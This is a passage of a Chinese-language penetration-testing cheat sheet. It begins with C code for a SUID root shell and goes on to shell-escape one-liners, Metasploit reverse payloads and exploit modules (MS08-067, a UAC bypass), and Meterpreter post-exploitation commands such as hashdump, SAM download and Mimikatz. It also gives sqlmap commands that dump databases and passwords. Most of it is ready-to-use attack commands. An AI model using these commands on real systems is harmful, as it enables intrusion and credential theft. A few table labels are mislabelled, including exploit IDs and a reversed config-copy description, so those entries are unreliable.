    int main(void){
           setresuid(0, 0, 0);
           system("/bin/sh");
    }
### 构建 SUID Shell 二进制
    gcc -o suid suid.c
32位
    gcc -m32 -o suid suid.c
## 反向Shells
参考 [反向 Shell 速查表](https://highon.coffee/blog/reverse-shell-cheat-sheet/) 。
## TTY Shells
Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for
running commands like `su` from reverse shells.
一些模拟出TTY终端窗口以突破shell限制的技巧，便于从反向shell上执行类似 `su` 的特殊命令。
### 用Python模拟 TTY Shell的技巧
    python -c 'import pty;pty.spawn("/bin/bash")'
    echo os.system('/bin/bash')
### 用sh模拟交互式shell
    /bin/sh -i
### 用Perl模拟 TTY Shell
    exec "/bin/sh";
    perl —e 'exec "/bin/sh";'
### 用Ruby模拟 TTY Shell
    exec "/bin/sh"
### 用Lua 模拟TTY Shell
    os.execute('/bin/sh')
### 从Vi模拟TTY Shell
    :!bash
### 用NMAP模拟TTY Shell
    !sh
## Metasploit 速查表
这是一个metasploit方便的速查手册。关于跳板技术可参看 [Meterpreter
Pivoting](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/) 。
### Meterpreter Payloads
### Windows 反向meterpreter payload
命令 | 解释  
---|---  
`set payload windows/meterpreter/reverse_tcp` | Windows 反向tcp payload  
### Windows VNC Meterpreter payload
命令 | 解释  
---|---  
`set payload windows/vncinject/reverse_tcp``set ViewOnly false` | Meterpreter
Windows VNC Payload  
### Linux 反向Meterpreter payload
命令 | 解释  
---|---  
`set payload linux/meterpreter/reverse_tcp` | Meterpreter Linux 反向Payload  
## Meterpreter速查表
有用的meterpreter 命令。
命令 | 解释  
---|---  
`upload file c:\\windows` | Meterpreter上传文件到 Windows 目标  
`download c:\\windows\\repair\\sam /tmp` | Meterpreter 从 Windows 目标下载文件  
`execute -f c:\\windows\temp\exploit.exe` | Meterpreter
在目标机器上执行.exe文件——用来执行上传的exp很方便  
`execute -f cmd -c` | 创建新的cmd shell通道  
`ps` | Meterpreter显示进程  
`shell` | Meterpreter获取目标shell  
`getsystem` | Meterpreter尝试提权  
`hashdump` | Meterpreter尝试导出目标机器上的哈希  
`portfwd add –l 3389 –p 3389 –r target` | Meterpreter端口转发  
`portfwd delete –l 3389 –p 3389 –r target` | Meterpreter删除端口转发  
## 常用Metasploit 模块
最常用的metasploit 模块。
### 远程Windows Metasploit 模块(exploits)
命令 | 解释  
---|---  
`use exploit/windows/smb/ms08_067_netapi` | MS08_067 Windows 2k, XP, 2003 远程攻击  
`use exploit/windows/dcerpc/ms06_040_netapi` | MS08_040 Windows NT, 2k, XP,
2003 远程攻击  
`use exploit/windows/smb/ms09_050_smb2_negotiate_func_index` | MS09_050
Windows Vista SP1/SP2 和Server 2008 (x86) 远程攻击  
### 本地Windows Metasploit 模块(exploits)
命令 | 解释  
---|---  
`use exploit/windows/local/bypassuac` | 绕过 Windows 7 上的UAC  
### 辅助Metasploit 模块
命令 | 解释  
---|---  
`use auxiliary/scanner/http/dir_scanner` | Metasploit HTTP 目录扫描  
`use auxiliary/scanner/http/jboss_vulnscan` | Metasploit JBOSS 漏扫  
`use auxiliary/scanner/mssql/mssql_login` | Metasploit MSSQL 认证扫描  
`use auxiliary/scanner/mysql/mysql_version` | Metasploit MSSQL 版本扫描  
`use auxiliary/scanner/oracle/oracle_login` | Metasploit Oracle 登陆模块  
### Metasploit Powershell 模块
命令 | 解释  
---|---  
`use exploit/multi/script/web_delivery` | Metasploit powershell payload c传送模块  
`post/windows/manage/powershell/exec_powershell` | Metasploit通过会话上传和执行
powershell脚本  
`use exploit/multi/http/jboss_maindeployer` | Metasploit JBOSS 部署  
`use exploit/windows/mssql/mssql_payload` | Metasploit MSSQL payload  
### Windows 后渗透Metasploit 模块
Windows Metasploit 提权模块。
命令 | 解释  
---|---  
`run post/windows/gather/win_privs` | Metasploit 显示当前用户权限  
`use post/windows/gather/credentials/gpp` | Metasploit 提取 GPP 保存的密码  
`load mimikatz -> wdigest` | Metasplit 加载 Mimikatz  
`run post/windows/gather/local_admin_search_enum` | 检查当前用户是否对域内其他机器有管理员权限  
`run post/windows/gather/smart_hashdump` | 自动化导出sam 文件，尝试提权等。  
## ASCII表速查
对Web应用渗透测试很有用，或者你被困在火星而需要和NASA通信。（梗自《火星救援》）
ASCII | 字符  
---|---  
`x00` | Null Byte 空字节  
`x08` | BS 退格  
`x09` | TAB 水平制表符  
`x0a` | LF 换行  
`x0d` | CR 回车  
`x1b` | ESC  
`x20` | SPC 空格  
`x21` | !  
`x22` | "  
`x23` | #  
`x24` | $  
`x25` | %  
`x26` | &  
`x27` | `  
`x28` | (  
`x29` | )  
`x2a` | *  
`x2b` | +  
`x2c` | ,  
`x2d` | -  
`x2e` | .  
`x2f` | /  
`x30` | 0  
`x31` | 1  
`x32` | 2  
`x33` | 3  
`x34` | 4  
`x35` | 5  
`x36` | 6  
`x37` | 7  
`x38` | 8  
`x39` | 9  
`x3a` | :  
`x3b` | ;  
`x3c` |   
`x3f` | ?  
`x40` | @  
`x41` | A  
`x42` | B  
`x43` | C  
`x44` | D  
`x45` | E  
`x46` | F  
`x47` | G  
`x48` | H  
`x49` | I  
`x4a` | J  
`x4b` | K  
`x4c` | L  
`x4d` | M  
`x4e` | N  
`x4f` | O  
`x50` | P  
`x51` | Q  
`x52` | R  
`x53` | S  
`x54` | T  
`x55` | U  
`x56` | V  
`x57` | W  
`x58` | X  
`x59` | Y  
`x5a` | Z  
`x5b` | [  
`x5c` | \  
`x5d` | ]  
`x5e` | ^  
`x5f` | _  
`x60` | `  
`x61` | a  
`x62` | b  
`x63` | c  
`x64` | d  
`x65` | e  
`x66` | f  
`x67` | g  
`x68` | h  
`x69` | i  
`x6a` | j  
`x6b` | k  
`x6c` | l  
`x6d` | m  
`x6e` | n  
`x6f` | o  
`x70` | p  
`x71` | q  
`x72` | r  
`x73` | s  
`x74` | t  
`x75` | u  
`x76` | v  
`x77` | w  
`x78` | x  
`x79` | y  
`x7a` | z  
## CISCO IOS(网际操作系统) 命令
收集一些有用的Cisco IOS 命令.
命令 | 解释  
---|---  
`enable` | 进入使能模式  
`conf t` | 配置终端  
`(config)# interface fa0/0` | 配置 FastEthernet 0/0  
`(config-if)# ip addr 0.0.0.0 255.255.255.255` | 添加IP到 fa0/0  
`(config-if)# line vty 0 4` | 配置 vty line  
`(config-line)# login` | 登陆  
`(config-line)# password YOUR-PASSWORD` | 设置 telnet 密码  
`# show running-config` | 显示内存中的运行配置  
`# show startup-config` | 显示启动配置  
`# show version` | 显示cisco IOS 版本  
`# show session` | 显示已打开的会话  
`# show ip interface` | 显示网卡  
`# show interface e0` | 显示网络接口细节  
`# show ip route` | 显示路由  
`# show access-lists` | 显示access lists  
`# dir file systems` | 列出可用文件  
`# dir all-filesystems` | 显示文件信息  
`# dir /all` | 显示已删除文件  
`# terminal length 0` | 取消终端输出长度限制  
`# copy running-config tftp` | 复制运行配置到tftp 服务器  
`# copy running-config startup-config` | 复制启动配置到运行配置  
## 密码学
### 哈希长度
哈希 | 长度  
---|---  
MD5 | `16 Bytes`  
SHA-1 | `20 Bytes`  
SHA-256 | `32 Bytes`  
SHA-512 | `64 Bytes`  
### 哈希例子
可以直接使用 **hash-identifier** 命令判断哈希类型，但这里还是举些例子。
哈希 | 例子  
---|---  
MD5 Hash Example | `8743b52063cd84097a65d1633f5c74f5`  
MD5 $PASS:$SALT Example | `01dfae6e5d4d90d9892622325959afbe:7050461`  
MD5 $SALT:$PASS | `f0fda58630310a6dd91a7d8f0a4ceda2:4225637426`  
SHA1 Hash Example | `b89eaac7e61417341b710b727768294d0e6a277b`  
SHA1 $PASS:$SALT | `2fc5a684737ce1bf7b3b239df432416e0dd07357:2014`  
SHA1 $SALT:$PASS | `cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024`  
SHA-256 | `127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935`  
SHA-256 $PASS:$SALT |
`c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4`  
SHA-256 $SALT:$PASS |
`eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617`  
SHA-512 |
`82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f`  
SHA-512 $PASS:$SALT |
`e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd`  
SHA-512 $SALT:$PASS |
`976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a`  
NTLM Hash Example | `b4b9b02e6f09a9bd760f388b67351e2b`  
## SQLMap例子
小型 SQLMap 速查表：
命令 | 解释  
---|---  
`sqlmap -u [meh.com](http://meh.com) --forms --batch --crawl=10
--cookie=jsessionid=54321 --level=5 --risk=3` | 自动化sqlmap扫描  
`sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3
--current-user --current-db --passwords --file-read="/var/www/blah.php"` |
指定目标的sqlmap scan  
`sqlmap -u "[meh.com/meh.php?id=1](http://meh.com/meh.php?id=1)" --dbms=mysql
--tech=U --random-agent --dump` | 使用联合查询技术扫描mysql后端的基于报错的注入 ，使用随机UA，导出数据库  
`sqlmap -o -u "[meh.com/form/](http://meh.com/form/)" --forms` | 检测可能存在注入点表单  
`sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump`
| 导出指定数据库的user表并尝试破解哈希。